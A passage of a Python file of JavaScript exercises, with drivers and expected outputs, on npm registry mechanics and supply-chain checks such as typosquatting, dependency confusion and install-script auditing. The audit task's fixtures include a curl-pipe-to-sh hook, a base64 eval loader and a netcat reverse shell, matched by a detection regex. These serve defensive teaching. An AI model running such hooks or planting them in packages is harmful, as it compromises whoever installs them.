"""Задачи книги «Современный Frontend»: глава 25."""

TASKS: dict[int, list[dict]] = {25: [{'id': 'j25-packument',
  'mode': 'js',
  'title': 'Сводка по документу пакета',
  'statement': "Напишите summarize(doc): doc — документ реестра { name, 'dist-tags', versions: { "
               'версия: { deprecated? } }, time: { версия: ISO-дата } }. Результат: { name, '
               'latest, versions, deprecated, tags, latestPublishedAt }: latest — '
               "doc['dist-tags'].latest (или null); versions — все ключи versions, отсортированные "
               'по semver по возрастанию; deprecated — версии с непустым deprecated (в том же '
               'порядке); tags — копия dist-tags с ключами по алфавиту; latestPublishedAt — '
               'time[latest] или null. Помощники parseV и cmpV есть.',
  'starter': '// Готово: разбор версии и сравнение (не изменяйте)\n'
             'function parseV(s) {\n'
             '  const m = '
             '/^v?(\\d+)\\.(\\d+)\\.(\\d+)(?:-([0-9A-Za-z.-]+))?$/.exec(String(s).trim());\n'
             '  if (!m) return null;\n'
             '  return { major: +m[1], minor: +m[2], patch: +m[3], pre: m[4] ? m[4].split(".") : '
             '[] };\n'
             '}\n'
             'function cmpV(a, b) {\n'
             '  const x = parseV(a), y = parseV(b);\n'
             '  for (const k of ["major", "minor", "patch"]) if (x[k] !== y[k]) return x[k] < y[k] '
             '? -1 : 1;\n'
             '  if (!x.pre.length && !y.pre.length) return 0;\n'
             '  if (!x.pre.length) return 1;\n'
             '  if (!y.pre.length) return -1;\n'
             '  const n = Math.max(x.pre.length, y.pre.length);\n'
             '  for (let i = 0; i < n; i++) {\n'
             '    if (i >= x.pre.length) return -1;\n'
             '    if (i >= y.pre.length) return 1;\n'
             '    const p = x.pre[i], q = y.pre[i];\n'
             '    if (p === q) continue;\n'
             '    const pn = /^\\d+$/.test(p), qn = /^\\d+$/.test(q);\n'
             '    if (pn && qn) return +p < +q ? -1 : 1;\n'
             '    if (pn) return -1;\n'
             '    if (qn) return 1;\n'
             '    return p < q ? -1 : 1;\n'
             '  }\n'
             '  return 0;\n'
             '}\n'
             '// Готово: поддерживает точную версию, ^, ~, >=, >, <=, <, * и «И» через пробел (без '
             'предрелизов)\n'
             'function satisfies(version, range) {\n'
             '  const v = parseV(version);\n'
             '  if (!v || v.pre.length) return false;\n'
             '  return range.trim().split(/\\s+/).every((c) => {\n'
             '    if (c === "*" || c === "") return true;\n'
             '    const m = /^(\\^|~|>=|<=|>|<|=)?(\\d+\\.\\d+\\.\\d+)$/.exec(c);\n'
             '    const op = m[1] || "=", t = parseV(m[2]);\n'
             '    const r = cmpV(version, m[2]);\n'
             '    if (op === "^") {\n'
             '      const up = t.major > 0 ? `${t.major + 1}.0.0` : t.minor > 0 ? `0.${t.minor + '
             '1}.0` : `0.0.${t.patch + 1}`;\n'
             '      return r >= 0 && cmpV(version, up) < 0;\n'
             '    }\n'
             '    if (op === "~") return r >= 0 && cmpV(version, `${t.major}.${t.minor + 1}.0`) < '
             '0;\n'
             '    return op === ">=" ? r >= 0 : op === "<=" ? r <= 0 : op === ">" ? r > 0 : op === '
             '"<" ? r < 0 : r === 0;\n'
             '  });\n'
             '}\n'
             'function summarize(doc) {\n'
             '}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const doc = {\n'
            '  name: "zod",\n'
            '  "dist-tags": { next: "4.0.0-beta.1", latest: "3.23.8" },\n'
            '  versions: { "3.23.8": {}, "3.9.0": { deprecated: "old" }, "3.10.0": {}, '
            '"4.0.0-beta.1": {}, "3.2.0": { deprecated: "" } },\n'
            '  time: { "3.23.8": "2024-05-01T00:00:00.000Z", "3.9.0": "2021-01-01T00:00:00.000Z" '
            '},\n'
            '};\n'
            'console.log(JSON.stringify(summarize(doc)));\n'
            'console.log(JSON.stringify(summarize({ name: "x", "dist-tags": {}, versions: { '
            '"1.0.0": {} } })));\n',
  'hint': 'Object.keys(doc.versions).sort(cmpV); filter по deprecated.',
  'expected': ['{"name":"zod","latest":"3.23.8","versions":["3.2.0","3.9.0","3.10.0","3.23.8","4.0.0-beta.1"],"deprecated":["3.9.0"],"tags":{"latest":"3.23.8","next":"4.0.0-beta.1"},"latestPublishedAt":"2024-05-01T00:00:00.000Z"}',
               '{"name":"x","latest":null,"versions":["1.0.0"],"deprecated":[],"tags":{},"latestPublishedAt":null}']},
 {'id': 'j25-resolve-tag',
  'mode': 'js',
  'title': 'Разрешение тега или диапазона',
  'statement': 'Напишите resolveSpec(doc, spec): определяет версию для установки. Если spec пуст '
               "или не задан — считайте 'latest'. Порядок: 1) spec — имя тега в doc['dist-tags'] → "
               'его версия; 2) spec — точная версия, существующая в doc.versions → она; 3) spec — '
               'диапазон: наибольшая подходящая версия, не помеченная deprecated (если таких нет — '
               "наибольшая из deprecated); 4) иначе Error('No matching version found for "
               "ИМЯ@SPEC'). Помощники parseV, cmpV, satisfies (для ^, ~, >=, >, <=, <, точных и "
               '«*») есть.',
  'starter': '// Готово: разбор версии и сравнение (не изменяйте)\n'
             'function parseV(s) {\n'
             '  const m = '
             '/^v?(\\d+)\\.(\\d+)\\.(\\d+)(?:-([0-9A-Za-z.-]+))?$/.exec(String(s).trim());\n'
             '  if (!m) return null;\n'
             '  return { major: +m[1], minor: +m[2], patch: +m[3], pre: m[4] ? m[4].split(".") : '
             '[] };\n'
             '}\n'
             'function cmpV(a, b) {\n'
             '  const x = parseV(a), y = parseV(b);\n'
             '  for (const k of ["major", "minor", "patch"]) if (x[k] !== y[k]) return x[k] < y[k] '
             '? -1 : 1;\n'
             '  if (!x.pre.length && !y.pre.length) return 0;\n'
             '  if (!x.pre.length) return 1;\n'
             '  if (!y.pre.length) return -1;\n'
             '  const n = Math.max(x.pre.length, y.pre.length);\n'
             '  for (let i = 0; i < n; i++) {\n'
             '    if (i >= x.pre.length) return -1;\n'
             '    if (i >= y.pre.length) return 1;\n'
             '    const p = x.pre[i], q = y.pre[i];\n'
             '    if (p === q) continue;\n'
             '    const pn = /^\\d+$/.test(p), qn = /^\\d+$/.test(q);\n'
             '    if (pn && qn) return +p < +q ? -1 : 1;\n'
             '    if (pn) return -1;\n'
             '    if (qn) return 1;\n'
             '    return p < q ? -1 : 1;\n'
             '  }\n'
             '  return 0;\n'
             '}\n'
             '// Готово: поддерживает точную версию, ^, ~, >=, >, <=, <, * и «И» через пробел (без '
             'предрелизов)\n'
             'function satisfies(version, range) {\n'
             '  const v = parseV(version);\n'
             '  if (!v || v.pre.length) return false;\n'
             '  return range.trim().split(/\\s+/).every((c) => {\n'
             '    if (c === "*" || c === "") return true;\n'
             '    const m = /^(\\^|~|>=|<=|>|<|=)?(\\d+\\.\\d+\\.\\d+)$/.exec(c);\n'
             '    const op = m[1] || "=", t = parseV(m[2]);\n'
             '    const r = cmpV(version, m[2]);\n'
             '    if (op === "^") {\n'
             '      const up = t.major > 0 ? `${t.major + 1}.0.0` : t.minor > 0 ? `0.${t.minor + '
             '1}.0` : `0.0.${t.patch + 1}`;\n'
             '      return r >= 0 && cmpV(version, up) < 0;\n'
             '    }\n'
             '    if (op === "~") return r >= 0 && cmpV(version, `${t.major}.${t.minor + 1}.0`) < '
             '0;\n'
             '    return op === ">=" ? r >= 0 : op === "<=" ? r <= 0 : op === ">" ? r > 0 : op === '
             '"<" ? r < 0 : r === 0;\n'
             '  });\n'
             '}\n'
             'function resolveSpec(doc, spec) {\n'
             '}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const doc = { name: "pkg", "dist-tags": { latest: "1.4.0", next: "2.0.0" }, versions: '
            '{ "1.0.0": {}, "1.2.0": {}, "1.3.0": { deprecated: "bug" }, "1.4.0": {}, "2.0.0": {}, '
            '"0.5.0": { deprecated: "x" } } };\n'
            'const t = (s) => { try { console.log(JSON.stringify(s), resolveSpec(doc, s)); } catch '
            '(e) { console.log(JSON.stringify(s), "!" + e.message); } };\n'
            't("latest"); t("next"); t(""); t(undefined); t("1.2.0"); t("^1.0.0"); t("~1.3.0"); '
            't("<1.0.0"); t("^3.0.0"); t("0.5.0"); t("2.0.0 1.0.0");\n',
  'hint': 'Сначала теги и точные версии, затем фильтр satisfies и максимум по cmpV.',
  'expected': ['"latest" 1.4.0',
               '"next" 2.0.0',
               '"" 1.4.0',
               'undefined 1.4.0',
               '"1.2.0" 1.2.0',
               '"^1.0.0" 1.4.0',
               '"~1.3.0" 1.3.0',
               '"<1.0.0" 0.5.0',
               '"^3.0.0" !No matching version found for pkg@^3.0.0',
               '"0.5.0" 0.5.0',
               '"2.0.0 1.0.0" !No matching version found for pkg@2.0.0 1.0.0']},
 {'id': 'j25-urls',
  'mode': 'js',
  'title': 'Адреса реестра',
  'statement': 'Напишите packumentUrl(registry, name) и tarballUrl(registry, name, version). '
               'registry может иметь завершающие «/» — уберите их. packumentUrl: «registry/имя»; в '
               'именах с областью «/» заменяется на «%2F» (например «@scope%2Fpkg»). tarballUrl: '
               '«registry/имя/-/базовое-имя-версия.tgz», где базовое имя — часть после последнего '
               '«/» (для «@scope/pkg» — «pkg»), а в пути имя остаётся с настоящим «/».',
  'starter': 'function packumentUrl(registry, name) {\n'
             '}\n'
             'function tarballUrl(registry, name, version) {\n'
             '}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const R = "https://registry.npmjs.org";\n'
            'console.log(packumentUrl(R, "lodash"));\n'
            'console.log(packumentUrl(R + "//", "@types/node"));\n'
            'console.log(tarballUrl(R, "lodash", "4.17.21"));\n'
            'console.log(tarballUrl(R + "/", "@types/node", "20.1.0"));\n'
            'console.log(tarballUrl("http://localhost:4873/", "@s/p", "1.0.0-beta.1"));\n',
  'hint': "registry.replace(/\\/+$/, ''); name.split('/').pop() — базовое имя.",
  'expected': ['https://registry.npmjs.org/lodash',
               'https://registry.npmjs.org/@types%2Fnode',
               'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz',
               'https://registry.npmjs.org/@types/node/-/node-20.1.0.tgz',
               'http://localhost:4873/@s/p/-/p-1.0.0-beta.1.tgz']},
 {'id': 'j25-registry-for',
  'mode': 'js',
  'title': 'Какой реестр у пакета',
  'statement': "Напишите registryFor(name, npmrc): npmrc = { registry, scopes: { '@scope': url } "
               "}. Для «@scope/имя» вернуть scopes['@scope'], если он задан, иначе npmrc.registry; "
               'для пакетов без области — npmrc.registry. Если npmrc.registry не задан — '
               "'https://registry.npmjs.org/'. В результате ровно один завершающий «/».",
  'starter': 'function registryFor(name, npmrc) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const rc = { registry: "https://mirror.example", scopes: { "@company": '
            '"https://npm.company.example//", "@x": "https://x.example/" } };\n'
            'for (const n of ["lodash", "@company/ui", "@x/y", "@other/z"]) console.log(n, '
            'registryFor(n, rc));\n'
            'console.log(registryFor("lodash", { scopes: {} }), registryFor("@a/b", {}));\n',
  'hint': 'Область — часть до первого «/» у имени, начинающегося с «@».',
  'expected': ['lodash https://mirror.example/',
               '@company/ui https://npm.company.example/',
               '@x/y https://x.example/',
               '@other/z https://mirror.example/',
               'https://registry.npmjs.org/ https://registry.npmjs.org/']},
 {'id': 'j25-auth-header',
  'mode': 'js',
  'title': 'Токен для реестра',
  'statement': "Напишите authHeader(url, auth): auth — { '//host/путь/': токен } (как в .npmrc). "
               'Уберите из url протокол («https:»), получив «//host/путь…». Найдите ключ auth, '
               "являющийся префиксом этой строки, самый длинный из подходящих. Верните 'Bearer ' + "
               'токен или null. Ключи сравниваются как есть (регистр учитывается).',
  'starter': 'function authHeader(url, auth) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const auth = { "//npm.company.example/": "T1", "//npm.company.example/private/": '
            '"T2", "//other.example/": "T3" };\n'
            'const t = (u) => console.log(u, authHeader(u, auth));\n'
            't("https://npm.company.example/@company%2Fui"); '
            't("https://npm.company.example/private/pkg/-/pkg-1.tgz"); '
            't("http://other.example/x");\n'
            't("https://public.example/x"); t("https://npm.company.example"); '
            't("https://NPM.company.example/x");\n',
  'hint': "url.replace(/^[a-z]+:/i, ''); из подходящих префиксов берите с максимальной длиной.",
  'expected': ['https://npm.company.example/@company%2Fui Bearer T1',
               'https://npm.company.example/private/pkg/-/pkg-1.tgz Bearer T2',
               'http://other.example/x Bearer T3',
               'https://public.example/x null',
               'https://npm.company.example null',
               'https://NPM.company.example/x null']},
 {'id': 'j25-parse-integrity',
  'mode': 'js',
  'title': 'Разбор integrity (SRI)',
  'statement': 'Напишите parseIntegrity(str) и strongest(str). parseIntegrity: записи разделены '
               'пробелами; запись — «алгоритм-значение[?параметры]»; значения алгоритмов sha256, '
               'sha384, sha512 допустимы, остальные (md5, sha1, мусор) отбрасываются. Результат — '
               'массив { algorithm, digest, options } (options — строка после «?» или null), '
               'отсортированный от самого сильного алгоритма к слабому (sha512, sha384, sha256), '
               'внутри алгоритма — в исходном порядке. strongest возвращает первый элемент или '
               'null.',
  'starter': 'function parseIntegrity(str) {\n}\nfunction strongest(str) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const s = "sha256-AAA= sha512-BBB== md5-xxx sha384-CCC?opt=1 garbage sha512-DDD=";\n'
            'console.log(JSON.stringify(parseIntegrity(s)));\n'
            'console.log(JSON.stringify(strongest(s)), JSON.stringify(strongest("sha256-Z=")), '
            'strongest("md5-x"), strongest(""));\n'
            'console.log(JSON.stringify(parseIntegrity("  sha1-a   sha256-b= ")));\n',
  'hint': 'Регулярка /^(sha256|sha384|sha512)-([A-Za-z0-9+/=_-]+)(?:\\?(.*))?$/ и сортировка по '
          'рангу.',
  'expected': ['[{"algorithm":"sha512","digest":"BBB==","options":null},{"algorithm":"sha512","digest":"DDD=","options":null},{"algorithm":"sha384","digest":"CCC","options":"opt=1"},{"algorithm":"sha256","digest":"AAA=","options":null}]',
               '{"algorithm":"sha512","digest":"BBB==","options":null} '
               '{"algorithm":"sha256","digest":"Z=","options":null} null null',
               '[{"algorithm":"sha256","digest":"b=","options":null}]']},
 {'id': 'j25-latest-stable',
  'mode': 'js',
  'title': 'Стабильная и предварительная версии',
  'statement': 'Напишите latestStable(versions) и nextPrerelease(versions). latestStable — '
               'наибольшая версия без предрелиза (некорректные строки пропускаются) или null. '
               'nextPrerelease — наибольшая предрелизная версия, которая новее latestStable (если '
               'стабильной нет — новее любой версии 0.0.0), или null. Помощники parseV и cmpV '
               'есть.',
  'starter': '// Готово: разбор версии и сравнение (не изменяйте)\n'
             'function parseV(s) {\n'
             '  const m = '
             '/^v?(\\d+)\\.(\\d+)\\.(\\d+)(?:-([0-9A-Za-z.-]+))?$/.exec(String(s).trim());\n'
             '  if (!m) return null;\n'
             '  return { major: +m[1], minor: +m[2], patch: +m[3], pre: m[4] ? m[4].split(".") : '
             '[] };\n'
             '}\n'
             'function cmpV(a, b) {\n'
             '  const x = parseV(a), y = parseV(b);\n'
             '  for (const k of ["major", "minor", "patch"]) if (x[k] !== y[k]) return x[k] < y[k] '
             '? -1 : 1;\n'
             '  if (!x.pre.length && !y.pre.length) return 0;\n'
             '  if (!x.pre.length) return 1;\n'
             '  if (!y.pre.length) return -1;\n'
             '  const n = Math.max(x.pre.length, y.pre.length);\n'
             '  for (let i = 0; i < n; i++) {\n'
             '    if (i >= x.pre.length) return -1;\n'
             '    if (i >= y.pre.length) return 1;\n'
             '    const p = x.pre[i], q = y.pre[i];\n'
             '    if (p === q) continue;\n'
             '    const pn = /^\\d+$/.test(p), qn = /^\\d+$/.test(q);\n'
             '    if (pn && qn) return +p < +q ? -1 : 1;\n'
             '    if (pn) return -1;\n'
             '    if (qn) return 1;\n'
             '    return p < q ? -1 : 1;\n'
             '  }\n'
             '  return 0;\n'
             '}\n'
             '// Готово: поддерживает точную версию, ^, ~, >=, >, <=, <, * и «И» через пробел (без '
             'предрелизов)\n'
             'function satisfies(version, range) {\n'
             '  const v = parseV(version);\n'
             '  if (!v || v.pre.length) return false;\n'
             '  return range.trim().split(/\\s+/).every((c) => {\n'
             '    if (c === "*" || c === "") return true;\n'
             '    const m = /^(\\^|~|>=|<=|>|<|=)?(\\d+\\.\\d+\\.\\d+)$/.exec(c);\n'
             '    const op = m[1] || "=", t = parseV(m[2]);\n'
             '    const r = cmpV(version, m[2]);\n'
             '    if (op === "^") {\n'
             '      const up = t.major > 0 ? `${t.major + 1}.0.0` : t.minor > 0 ? `0.${t.minor + '
             '1}.0` : `0.0.${t.patch + 1}`;\n'
             '      return r >= 0 && cmpV(version, up) < 0;\n'
             '    }\n'
             '    if (op === "~") return r >= 0 && cmpV(version, `${t.major}.${t.minor + 1}.0`) < '
             '0;\n'
             '    return op === ">=" ? r >= 0 : op === "<=" ? r <= 0 : op === ">" ? r > 0 : op === '
             '"<" ? r < 0 : r === 0;\n'
             '  });\n'
             '}\n'
             'function latestStable(versions) {\n'
             '}\n'
             'function nextPrerelease(versions) {\n'
             '}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const t = (vs) => console.log(latestStable(vs), nextPrerelease(vs));\n'
            't(["1.0.0", "1.1.0", "2.0.0-beta.1", "2.0.0-beta.2", "bad"]);\n'
            't(["1.0.0", "2.0.0-rc.1", "2.0.0"]);\n'
            't(["1.0.0-alpha", "1.0.0-beta"]);\n'
            't(["3.1.0", "3.2.0-next.1", "3.1.5"]);\n'
            't([]);\n',
  'hint': 'Отфильтруйте parseV и признак pre.length; максимум через reduce и cmpV.',
  'expected': ['1.1.0 2.0.0-beta.2',
               '2.0.0 null',
               'null 1.0.0-beta',
               '3.1.5 3.2.0-next.1',
               'null null']},
 {'id': 'j25-typosquat',
  'mode': 'js',
  'title': 'Поиск опечаток в именах',
  'statement': 'Напишите findTyposquats(name, popular, maxDistance = 2): возвращает имена из '
               'popular (кроме равного name), расстояние до которых от name не больше maxDistance, '
               'отсортированные по расстоянию, затем по имени. Расстояние — Дамерау–Левенштейна '
               '(вставка, удаление, замена символа и перестановка двух соседних символов — по 1; '
               'вариант OSA). Сравнение строчное: перед расчётом приведите оба имени к нижнему '
               'регистру. Если name совпадает (без учёта регистра) с одним из popular — вернуть '
               '[].',
  'starter': 'function findTyposquats(name, popular, maxDistance = 2) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const pop = ["lodash", "express", "react", "request", "reaction", "chalk", "colors", '
            '"debug", "left-pad", "left_pad"];\n'
            'const t = (n, d) => console.log(n, d ?? "", JSON.stringify(findTyposquats(n, pop, '
            'd)));\n'
            't("lodahs"); t("expres"); t("raect"); t("reakt"); t("react"); t("REACT"); t("chalks", '
            '1); t("colour", 1); t("colour", 2); t("xyz"); t("leftpad", 2);\n'
            'console.log(JSON.stringify(findTyposquats("abc", [], 2)));\n',
  'hint': 'Динамическое программирование по таблице d[i][j]; для перестановки смотрите '
          'd[i-2][j-2].',
  'expected': ['lodahs  ["lodash"]',
               'expres  ["express"]',
               'raect  ["react"]',
               'reakt  ["react"]',
               'react  []',
               'REACT  []',
               'chalks 1 ["chalk"]',
               'colour 1 []',
               'colour 2 ["colors"]',
               'xyz  []',
               'leftpad 2 ["left-pad","left_pad"]',
               '[]']},
 {'id': 'j25-confusion',
  'mode': 'js',
  'title': 'Риск подмены внутренних имён',
  'statement': 'Напишите confusionRisk(internal, publicIndex): internal — { имя: версия } '
               'внутренних пакетов, publicIndex — { имя: [версии] } того, что существует в '
               'публичном реестре. Верните массив { name, internal, publicMax } для имён, которые '
               'есть в публичном реестре и чья наибольшая публичная версия строго новее внутренней '
               '(такая версия «победит» при установке из публичного реестра). Отсортируйте по '
               'имени. Некорректные версии игнорируются. Помощники parseV, cmpV есть.',
  'starter': '// Готово: разбор версии и сравнение (не изменяйте)\n'
             'function parseV(s) {\n'
             '  const m = '
             '/^v?(\\d+)\\.(\\d+)\\.(\\d+)(?:-([0-9A-Za-z.-]+))?$/.exec(String(s).trim());\n'
             '  if (!m) return null;\n'
             '  return { major: +m[1], minor: +m[2], patch: +m[3], pre: m[4] ? m[4].split(".") : '
             '[] };\n'
             '}\n'
             'function cmpV(a, b) {\n'
             '  const x = parseV(a), y = parseV(b);\n'
             '  for (const k of ["major", "minor", "patch"]) if (x[k] !== y[k]) return x[k] < y[k] '
             '? -1 : 1;\n'
             '  if (!x.pre.length && !y.pre.length) return 0;\n'
             '  if (!x.pre.length) return 1;\n'
             '  if (!y.pre.length) return -1;\n'
             '  const n = Math.max(x.pre.length, y.pre.length);\n'
             '  for (let i = 0; i < n; i++) {\n'
             '    if (i >= x.pre.length) return -1;\n'
             '    if (i >= y.pre.length) return 1;\n'
             '    const p = x.pre[i], q = y.pre[i];\n'
             '    if (p === q) continue;\n'
             '    const pn = /^\\d+$/.test(p), qn = /^\\d+$/.test(q);\n'
             '    if (pn && qn) return +p < +q ? -1 : 1;\n'
             '    if (pn) return -1;\n'
             '    if (qn) return 1;\n'
             '    return p < q ? -1 : 1;\n'
             '  }\n'
             '  return 0;\n'
             '}\n'
             '// Готово: поддерживает точную версию, ^, ~, >=, >, <=, <, * и «И» через пробел (без '
             'предрелизов)\n'
             'function satisfies(version, range) {\n'
             '  const v = parseV(version);\n'
             '  if (!v || v.pre.length) return false;\n'
             '  return range.trim().split(/\\s+/).every((c) => {\n'
             '    if (c === "*" || c === "") return true;\n'
             '    const m = /^(\\^|~|>=|<=|>|<|=)?(\\d+\\.\\d+\\.\\d+)$/.exec(c);\n'
             '    const op = m[1] || "=", t = parseV(m[2]);\n'
             '    const r = cmpV(version, m[2]);\n'
             '    if (op === "^") {\n'
             '      const up = t.major > 0 ? `${t.major + 1}.0.0` : t.minor > 0 ? `0.${t.minor + '
             '1}.0` : `0.0.${t.patch + 1}`;\n'
             '      return r >= 0 && cmpV(version, up) < 0;\n'
             '    }\n'
             '    if (op === "~") return r >= 0 && cmpV(version, `${t.major}.${t.minor + 1}.0`) < '
             '0;\n'
             '    return op === ">=" ? r >= 0 : op === "<=" ? r <= 0 : op === ">" ? r > 0 : op === '
             '"<" ? r < 0 : r === 0;\n'
             '  });\n'
             '}\n'
             'function confusionRisk(internal, publicIndex) {\n'
             '}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const internal = { "@co/ui": "1.2.0", "@co/api": "3.0.0", "internal-utils": "1.0.0", '
            '"safe-lib": "2.0.0", "zzz": "1.0.0" };\n'
            'const pub = { "internal-utils": ["99.0.0", "0.1.0"], "@co/api": ["2.9.9", "3.0.0"], '
            '"safe-lib": ["1.0.0", "bad", "2.0.1"], "@co/ui": ["bad"], other: ["9.9.9"] };\n'
            'console.log(JSON.stringify(confusionRisk(internal, pub)));\n'
            'console.log(JSON.stringify(confusionRisk({}, pub)));\n',
  'hint': 'Для каждого внутреннего имени найдите максимум публичных версий через cmpV.',
  'expected': ['[{"name":"internal-utils","internal":"1.0.0","publicMax":"99.0.0"},{"name":"safe-lib","internal":"2.0.0","publicMax":"2.0.1"}]',
               '[]']},
 {'id': 'j25-scripts-audit',
  'mode': 'js',
  'title': 'Аудит скриптов установки',
  'statement': 'Напишите scriptsAudit(packages): packages — { имя: { scripts } }. Для каждого '
               'пакета возьмите хуки установки в порядке preinstall, install, postinstall (только '
               'существующие). Пакеты без хуков пропускаются. Результат — массив { name, hooks, '
               'risky }, отсортированный по имени: hooks — имена присутствующих хуков; risky — '
               'true, если текст хотя бы одного из этих скриптов подходит под '
               '/(curl|wget|powershell|base64|eval|\\bnc\\b|\\|\\s*(ba)?sh\\b)/i.',
  'starter': 'function scriptsAudit(packages) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const pk = {\n'
            '  esbuild: { scripts: { postinstall: "node install.js" } },\n'
            '  evil: { scripts: { preinstall: "curl http://x.example/a.sh | sh", test: "echo ok" } '
            '},\n'
            '  b64: { scripts: { install: "node -e '
            '\\"eval(Buffer.from(x,\'base64\').toString())\\"", postinstall: "echo done" } },\n'
            '  clean: { scripts: { test: "node --test", build: "tsc" } },\n'
            '  nothing: {},\n'
            '  netcat: { scripts: { postinstall: "nc -e /bin/sh host 9" } },\n'
            '  sync: { scripts: { postinstall: "async-sync run" } },\n'
            '};\n'
            'console.log(JSON.stringify(scriptsAudit(pk)));\n',
  'hint': 'Используйте готовое регулярное выражение из условия; перебирайте фиксированный список '
          'хуков.',
  'expected': ['[{"name":"b64","hooks":["install","postinstall"],"risky":true},{"name":"esbuild","hooks":["postinstall"],"risky":false},{"name":"evil","hooks":["preinstall"],"risky":true},{"name":"netcat","hooks":["postinstall"],"risky":true},{"name":"sync","hooks":["postinstall"],"risky":false}]']},
 {'id': 'j25-license-expr',
  'mode': 'js',
  'title': 'SPDX-выражения',
  'statement': 'Напишите licenseAllowed(expr, allowed, denied): expr — SPDX-выражение из лицензий, '
               'операторов AND, OR (заглавными) и скобок; AND сильнее OR. Конструкция «X WITH '
               'исключение» считается лицензией X. Лицензия допустима, если она в allowed и не в '
               'denied. Результат — true/false для всего выражения (A OR B — хотя бы одна '
               'допустима, A AND B — обе). Пустое выражение или синтаксическая ошибка — false.',
  'starter': 'function licenseAllowed(expr, allowed, denied) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const allowed = ["MIT", "Apache-2.0", "BSD-3-Clause", "ISC", "GPL-2.0"], denied = '
            '["AGPL-3.0"];\n'
            'const t = (e) => console.log(JSON.stringify(e), licenseAllowed(e, allowed, denied));\n'
            't("MIT"); t("GPL-3.0"); t("MIT OR GPL-3.0"); t("MIT AND GPL-3.0"); t("(MIT OR '
            'GPL-3.0) AND ISC"); t("MIT OR GPL-3.0 AND AGPL-3.0");\n'
            't("(MIT AND ISC) OR AGPL-3.0"); t("GPL-2.0 WITH Classpath-exception-2.0"); '
            't("AGPL-3.0"); t(""); t("MIT AND"); t("(MIT"); t("MIT OR (Apache-2.0 AND (ISC OR '
            'X))");\n',
  'hint': 'Токенизация по пробелам и скобкам; рекурсивный разбор: orExpr → andExpr → atom.',
  'expected': ['"MIT" true',
               '"GPL-3.0" false',
               '"MIT OR GPL-3.0" true',
               '"MIT AND GPL-3.0" false',
               '"(MIT OR GPL-3.0) AND ISC" true',
               '"MIT OR GPL-3.0 AND AGPL-3.0" true',
               '"(MIT AND ISC) OR AGPL-3.0" true',
               '"GPL-2.0 WITH Classpath-exception-2.0" true',
               '"AGPL-3.0" false',
               '"" false',
               '"MIT AND" false',
               '"(MIT" false',
               '"MIT OR (Apache-2.0 AND (ISC OR X))" true']},
 {'id': 'j25-unpublish',
  'mode': 'js',
  'title': 'Можно ли удалить версию',
  'statement': 'Напишите canUnpublish({ publishedAt, now, dependents, weeklyDownloads, owners }) → '
               '{ allowed, reason }. Времена — миллисекунды. Если с публикации прошло меньше 72 '
               "часов — { allowed: true, reason: 'within 72 hours' }. Иначе удаление разрешено "
               'только при отсутствии зависимых (dependents === 0), числе скачиваний за неделю '
               'меньше 300 и единственном владельце (owners.length === 1): тогда { allowed: true, '
               "reason: 'no dependents' }. Первое нарушенное условие по порядку даёт { allowed: "
               "false, reason }: 'has dependents', 'too many downloads', 'multiple owners'.",
  'starter': 'function canUnpublish(info) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const H = 3600 * 1000;\n'
            'const base = { publishedAt: 0, dependents: 0, weeklyDownloads: 10, owners: ["a"] };\n'
            'const t = (o) => console.log(JSON.stringify(canUnpublish({ ...base, ...o })));\n'
            't({ now: 10 * H, dependents: 50, weeklyDownloads: 99999, owners: ["a", "b"] });\n'
            't({ now: 72 * H - 1 }); t({ now: 72 * H }); t({ now: 100 * H });\n'
            't({ now: 100 * H, dependents: 1 }); t({ now: 100 * H, weeklyDownloads: 300 }); t({ '
            'now: 100 * H, weeklyDownloads: 299 });\n'
            't({ now: 100 * H, owners: ["a", "b"] }); t({ now: 100 * H, dependents: 2, '
            'weeklyDownloads: 1000, owners: ["a", "b"] });\n',
  'hint': '72 * 3600 * 1000 мс; проверки в порядке dependents → downloads → owners.',
  'expected': ['{"allowed":true,"reason":"within 72 hours"}',
               '{"allowed":true,"reason":"within 72 hours"}',
               '{"allowed":true,"reason":"no dependents"}',
               '{"allowed":true,"reason":"no dependents"}',
               '{"allowed":false,"reason":"has dependents"}',
               '{"allowed":false,"reason":"too many downloads"}',
               '{"allowed":true,"reason":"no dependents"}',
               '{"allowed":false,"reason":"multiple owners"}',
               '{"allowed":false,"reason":"has dependents"}']},
 {'id': 'j25-can-publish',
  'mode': 'js',
  'title': 'Проверка перед публикацией',
  'statement': 'Напишите checkPublish(manifest, published, opts = {}): published — массив уже '
               'опубликованных версий, opts.tag — тег публикации. Верните массив ошибок в порядке '
               'проверок: «package is private» (manifest.private === true); «name is required» '
               '(нет непустого name); «invalid version» (version не x.y.z[-pre][+build]; если '
               'версия некорректна, следующие проверки версии пропускаются); «version already '
               'published» (версия есть в published); «prerelease requires a tag other than '
               "latest» (в версии есть предрелиз, а opts.tag не задан или равен 'latest').",
  'starter': 'function checkPublish(manifest, published, opts = {}) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const t = (m, p, o) => console.log(JSON.stringify(checkPublish(m, p, o)));\n'
            't({ name: "a", version: "1.0.0" }, []);\n'
            't({ name: "a", version: "1.0.0" }, ["1.0.0"]);\n'
            't({ name: "a", version: "2.0.0-beta.1" }, ["1.0.0"]);\n'
            't({ name: "a", version: "2.0.0-beta.1" }, [], { tag: "next" });\n'
            't({ name: "a", version: "2.0.0-beta.1" }, [], { tag: "latest" });\n'
            't({ private: true, name: "", version: "1.0" }, []);\n'
            't({ name: "a", version: "1.0.0+build.5" }, ["1.0.0+build.5"]);\n'
            't({}, []);\n',
  'hint': 'Последовательные if с push; предрелиз — наличие «-» в части версии до «+».',
  'expected': ['[]',
               '["version already published"]',
               '["prerelease requires a tag other than latest"]',
               '[]',
               '["prerelease requires a tag other than latest"]',
               '["package is private","name is required","invalid version"]',
               '["version already published"]',
               '["name is required","invalid version"]']},
